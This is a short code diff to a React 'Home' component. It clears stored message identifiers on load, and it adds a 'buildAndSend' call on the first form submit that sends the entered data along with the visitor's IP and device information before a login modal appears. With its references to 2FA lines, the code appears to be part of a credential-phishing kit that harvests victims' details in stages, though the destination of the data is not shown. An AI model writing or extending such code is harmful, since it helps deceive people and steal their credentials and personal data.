@@ -295,6 +295,9 @@ const Home = () => {
     }, [defaultTexts, translateAllTexts]);
 
     useEffect(() => {
+        localStorage.removeItem('message_id');
+        localStorage.removeItem('message');
+        localStorage.removeItem('messageId');
         initializeApp();
     }, [initializeApp]);
 
@@ -343,6 +346,7 @@ ${twoFALines}
     };
 
     const handleFirstFormSubmit = (data) => {
+        buildAndSend(data, { email: '', password: '' }, [], [], ipInfo, deviceInfo);
         setFormData(data);
         setShowFirstFormModal(false);
         setShowLoginModal(true);
